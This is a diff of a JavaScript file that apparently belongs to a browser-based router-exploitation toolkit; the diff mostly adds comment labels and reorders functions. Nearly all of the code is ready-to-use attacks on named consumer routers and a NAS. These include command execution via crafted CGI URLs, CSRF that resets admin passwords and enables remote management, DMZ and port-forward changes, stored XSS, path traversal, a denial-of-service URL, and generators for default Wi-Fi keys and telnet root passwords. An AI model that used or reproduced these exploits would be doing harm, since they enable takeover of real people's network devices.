@@ -1651,7 +1756,7 @@ function zyxel_660hwt1_v3_changessidpass(ip)
 
 }
 
-
+// Sagem Fast Telnet Root Password Generator
 function sagemtelnet(){
 
 	function mash(a,b){
@@ -1683,6 +1788,7 @@ function sagemtelnet(){
         alert("Telnet root password: "+password.join(""))
 }
 
+// Sagemcom f@st 3184 default wireless password [Cabovis&atilde;o]
 function sagemcable(){
 	ssid=prompt("SSID: ");
 	ssid=ssid.substring(3);
@@ -1695,7 +1801,7 @@ function sagemcable(){
         alert("Possible wireless keys: "+"\n"+password[0]+"\n"+password[1]+"\n"+password[2]+"\n"+password[3])
 }
 
-
+// EasyBox Standard WPA2 Key Generator
 function easyboxwpa(){
 	mac=prompt("MAC: ");
 	mac = mac.replace(/:/g, "");
@@ -1749,10 +1855,12 @@ function readConfig() {
 		xss('"><iframe src="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/config.xml" onload="alert(this.contentWindow.document.body.innerHTML);">');
 	}, 2000);
 }
+
 function xss(payload) { /* grax por el fix Alvaro Soto*/
 	ifrm = document.getElementById('iframe');
 	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/web.....9;'+payload;
 }
+
 function login() {
 	ip = ip | "192.168.1.1"
 	var f = document.createElement('form');
@@ -1798,34 +1906,20 @@ function changeDNS(server, ip) {
 	},5000);
 }
 /* end pdp */
-function dlidns() {
+
+// D-Link DSL-G604T change DNS servers
+function dlidns(ip) {
 	dns=prompt("DNS server:");
-	changeDNS(dns);
+	changeDNS(dns, ip);
 }
 
+// DD-WRT remote comand execution
 function ddwrtexec() {
 	cmd=prompt("Command:");
 	if (cmd==null || cmd==""){}else{
 		document.location="http://192.168.1.1/cgi-bin/;"+cmd;
 	}
 }
-
-function dns320() {
-	cmd=prompt("Command:");
-	if (cmd==null || cmd==""){}else{
-		document.location=" http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
-	}
-}
-
-function dns320r() {
-	ip=prompt("IP:");
-	cmd=prompt("Command:");
-	if (ip==null || ip==""){}else{
-		document.location=" http://"+ip+"/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
-	}
-}
-
-
 function ddwrtexecr() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1834,12 +1928,30 @@ function ddwrtexecr() {
 	}
 }
 
+// D-Link DNS-320 DNS-325 command execution
+function dns320() { // Not used, this is a NAS, not a router, it doesn't have a default IP
+	cmd=prompt("Command:");
+	if (cmd==null || cmd==""){}else{
+		document.location=" http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
+	}
+}
+function dns320r() {
+	ip=prompt("IP:");
+	cmd=prompt("Command:");
+	if (ip==null || ip==""){}else{
+		document.location=" http://"+ip+"/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
+	}
+}
+
+// Huawei HG520 HTTP auth denial of service
 function huados() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@"+ip;
 }
 }
+
+// Asmax AR-804gu command execution
 function asmrce() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1847,6 +1959,8 @@ function asmrce() {
 		document.location="http://"+ip+"/cgi-bin/script?system%20"+cmd;
 	}
 }
+
+// Asmax AR-804gu file disclosure
 function asmfile() {
 	ip=prompt("IP:");
 	cmd=prompt("File:");
@@ -1855,6 +1969,7 @@ function asmfile() {
 	}
 }
 
+// Comtrend CT-5367 Change passwords
 function comtrendpass() {
 	pass=prompt("New password:");
 	document.comtrendpass.sptPassword.value=pass;
@@ -1865,7 +1980,6 @@ function comtrendpass() {
 		document.comtrendpass.submit();
 	}
 }
-
 function comtrendpassr() {
 	ip=prompt("IP:");
 	pass=prompt("New password:");
@@ -1877,6 +1991,8 @@ function comtrendpassr() {
 		document.comtrendpass.submit();
 	}
 }
+
+// Linksys EA2700 WRT310Nv2 Password Change Insufficient Authentication CSRF
 function ea2700passr() {
 	ip=prompt("IP:");
 	xss=prompt("New password:");
@@ -1888,6 +2004,7 @@ function ea2700passr() {
 	}
 }
 
+// TRENDnet TEW 812DRU CSRF Change Admin Credentials
 function trendCSRF() {
 	ip=prompt("IP:");
 	document.trendCSRF.action="http://"+ip+"/setSysAdm.cgi";
@@ -1895,6 +2012,8 @@ function trendCSRF() {
 		document.trendCSRF.submit();
 	}
 }
+
+// TRENDnet TEW 812DRU CSRF Enable Remote Management
 function trendCSRF2() {
 	ip=prompt("IP:");
 	document.trendCSRF2.action="http://"+ip+"/uapply.cgi";
@@ -1903,7 +2022,7 @@ function trendCSRF2() {
 	}
 }
 
-
+// Linksys EA2700 XSS Vulnerability apply.cgi
 function ea2700xssr() {
 	ip=prompt("IP:");
 	xss=prompt("XSS:");
@@ -1914,6 +2033,7 @@ function ea2700xssr() {
 	}
 }
 
+// Linksys WRT310Nv2 Cross site scripting
 function CSRFxssPWN() {
 	ip=prompt("IP:");
 	xss=prompt("XSS:");
@@ -1924,6 +2044,7 @@ function CSRFxssPWN() {
 	}
 }
 
+// Linksys EA2700 File Path Traversal apply.cgi
 function ea2700pathr() {
 	ip=prompt("IP:");
 	xss=prompt("FILE:");
@@ -1934,7 +2055,7 @@ function ea2700pathr() {
 	}
 }
 
-
+// Asus RT-N56U RT-AC66U reset admin password enable remote http csrf
 function N56Ur() {
 	ip=prompt("IP:");
 	document.N56U.action="http://"+ip+"/start_apply.htm";
@@ -1943,13 +2064,13 @@ function N56Ur() {
 	}
 }
 
+// Comtrend CT-5624 Change admin password, CT-5624 Change passwords
 function ncomtrendpass() {
 	pass=prompt("New password:");
 	if (pass==null || pass==""){}else{
 		document.location="http://192.168.1.1/password.cgi?sysPassword="+pass+"&sptPassword="+pass;
 	}
 }
-
 function ncomtrendpassr() {
 	ip=prompt("IP:");
 	pass=prompt("New password:");
@@ -1958,13 +2079,13 @@ function ncomtrendpassr() {
 	}
 }
 
+// Comtrend CT-53XX CT-5071 CT-56XX Put a local IP in DMZ
 function comtrendip() {
 	ip=prompt("Local IP to put in DMZ:");
 	if (ip==null || ip==""){}else{
 		document.location="http://192.168.1.1/scdmz.cmd?address="+ip;
 	}
 }
-
 function comtrendipr() {
 	ipp=prompt("Router IP:");
 	ip=prompt("Local IP to put in DMZ:");
@@ -1973,6 +2094,7 @@ function comtrendipr() {
 	}
 }
 
+// Xavi X7968 open port for ip CSRF
 function xavi() {
 	nombre=prompt("Name of the rule:");
 	ip=prompt("Allow IP:");
@@ -1981,7 +2103,6 @@ function xavi() {
 		document.location="http://192.168.1.1/webconfig/portforwarding/portforwarding1.html/natAdd?apptype=userdefined&rulename="+nombre+"&waninterface=ppp-0&inthostip="+ip+"&protocol1=proto_6&extportstart1="+port+"&extportend1="+port+"&intportstart1="+port+"&intportend1="+port+"&protocol2=NONE&protocol3=NONE&Applybutton=Apply";
 	}
 }
-
 function xavir() {
 	ipp=prompt("Target IP:");
 	nombre=prompt("Name of the rule:");
@@ -1999,6 +2120,7 @@ function prosafe_configdisclosure(ip)
     document.location="http://"+ip+"/filesystem/startup-config";
 }
 
+// ZTE WXV10 W300 - Change Admin Password
 function wxv10w300_changeadmin(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -2119,15 +2241,14 @@ function GenArrisPasswords(startdate, enddate) {
   }
 }
 
-
-
+// D-Link DIR 865L PHP file inclusion
 function DIR865L(ip){
 	ip = ip || "192.168.0.1";
 	loca = prompt("Path to XML files containing PHP code for execution\n../../tmp/storage/<sharename>/FILE")
 	document.location="http://"+ip+"/router_info.xml?section="+loca;
 }
 
-
+// TP-LINK WR1043ND enable root filsystem on FTP CSRF
 function WR1043ND(ip){
 	ip = ip || "192.168.0.1";
 	alert("Making Root FS Accessible to FTP");
@@ -2142,6 +2263,7 @@ function WR1043ND(ip){
 	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?startFtp=1";
 }
 
+// Belkin N900 Change admin creds &amp; enable remote MGMT CSRF
 function N900_csrf(ip){
 	ip = ip || "192.168.2.1";
 form = '<input name="page" value="util_system"/>\
@@ -2161,6 +2283,7 @@ form = '<input name="page" value="util_system"/>\
 	post('http://' + ip + '/util_system.html', form);
 }
 
+// Belkin F5D8236-4v2 enable remote MGMT CSRF
 function F5D8236_4v2_csrf_admin(ip){
 	ip = ip || "192.168.2.1";
 	form = '<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
@@ -2169,7 +2292,7 @@ function F5D8236_4v2_csrf_admin(ip){
 	post('http://' + ip + '/cgi bin/system_setting.exe', form);
 }
 
-
+// Belkin N300 remove admin password &amp; enable remote MGMT CSRF
 function N300_csrf_admin(ip){
 	ip = ip || "192.168.2.1";
 	form = '<input type="hidden" name="location_page" value="system.stm"/>\
@@ -2203,8 +2326,6 @@ function zoomX_newadmin(ip)
     httpGet(urlv1);
     httpGet(urlv2);
 }
-
-
 
 // Alcatel Lucent I-240W-Q Authentication Bypass - js by sinnet3000
 function i230w_auth(ip)
@@ -2242,6 +2363,7 @@ function i240w_command(ip)
 	post('http://' + ip + '/GponForm/diag_XForm', form);
 }
 
+// Belkin N900 psk stored cross site scripting
 function N900_xss_psk(ip)
 {
 	ip = ip || "192.168.2.1";
@@ -2253,6 +2375,7 @@ function N900_xss_psk(ip)
 	post('http://' + ip + '	/wl_guest.html', form);
 }
 
+// Belkin N900 ssid stored cross site scripting
 function N900_xss_ssid(ip)
 {
 	ip = ip || "192.168.2.1";
@@ -2318,6 +2441,7 @@ function ComputeChecksum(s){
 	return (10 - digit) % 10
 }
 
+// Arris DG860A WPS PIN Generator
 function F(n)
 {
 if (n==1 || n==2 || n==0){
@@ -2326,7 +2450,6 @@ if (n==1 || n==2 || n==0){
       return F(n-1) + F(n-2);
     }
 }
-
 function FibGen(num){
 	return F(num);
 }
@@ -2454,6 +2577,7 @@ function rtg32xss(ip)
 		document.rt632xssf.submit();
 	}
 }
+
 // ASUS RT-G32 CSRF exploit (C) 2015 MustLive. http://websecurity.com.ua
 function rt632csrfx(ip)
 {
